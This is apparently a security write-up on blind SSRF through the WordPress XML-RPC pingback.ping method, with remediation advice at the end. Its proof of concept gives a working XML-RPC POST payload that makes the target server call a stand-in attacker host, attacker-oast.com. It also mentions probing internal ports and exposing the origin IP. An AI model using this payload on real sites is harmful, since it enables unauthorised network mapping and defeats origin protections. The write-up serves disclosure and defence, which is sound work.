title: How I Triggered Blind SSRF via XML-RPC Pingback API
description: A walkthrough of how I leveraged WordPress xmlrpc.php configurations to map internal networks and leak backend server IPs.
markdown:
### 🔍 Background & Discovery

During a reconnaissance phase on a corporate target (`target-corp.com`), I noticed that the WordPress XML-RPC endpoint `/xmlrpc.php` was publicly accessible and misconfigured.

Specifically, the `pingback.ping` method was enabled. This feature is designed to allow external blogs to notify the site when they link to an article. However, by abusing the API parameters, I was able to turn the target server into a proxy, forcing it to send HTTP/DNS queries to arbitrary external or internal IP addresses.

---

### 🧪 Proof of Concept (PoC)

1. **Create Listener**: I generated a unique Out-of-Band (OAST) listener URL.
2. **Send Payload**: Using `curl`, I sent a POST request to the XML-RPC endpoint, specifying my listener as the source and a valid post link as the target:
   ```http
   POST /xmlrpc.php HTTP/1.1
   Host: target-corp.com
   Content-Type: text/xml

   <?xml version="1.0" encoding="utf-8"?>
   <methodCall>
     <methodName>pingback.ping</methodName>
     <params>
       <param><value><string>http://attacker-oast.com/ssrf_check</string></value></param>
       <param><value><string>https://target-corp.com/blog/valid-post</string></value></param>
     </params>
   </methodCall>
   ```
3. **Verify SSRF**: The OAST listener recorded incoming DNS lookups and HTTP GET requests originating from the target portal's backend IP.

---

### ⚡ Security Impact & Severity: MEDIUM

- **Internal Port Scanning (XSPA)**: An attacker could scan internal ports (e.g. `http://127.0.0.1:22` or `127.0.0.1:3306`) by observing response delays or changes in return codes.
- **Origin IP Disclosure**: Bypasses cloud security proxies (such as Cloudflare) and exposes the real server IP address.

---

### 🛡️ Remediation & Advice

- **Disable XML-RPC**: If XML-RPC is not required, block access to `/xmlrpc.php` via Nginx/Apache configuration:
   ```nginx
   location = /xmlrpc.php {
       deny all;
   }
   ```
- **Filter Methods**: Disable only the pingback method via your theme's `functions.php`:
   ```php
   add_filter('xmlrpc_methods', function($methods) {
       unset($methods['pingback.ping']);
       return $methods;
   });
   ```
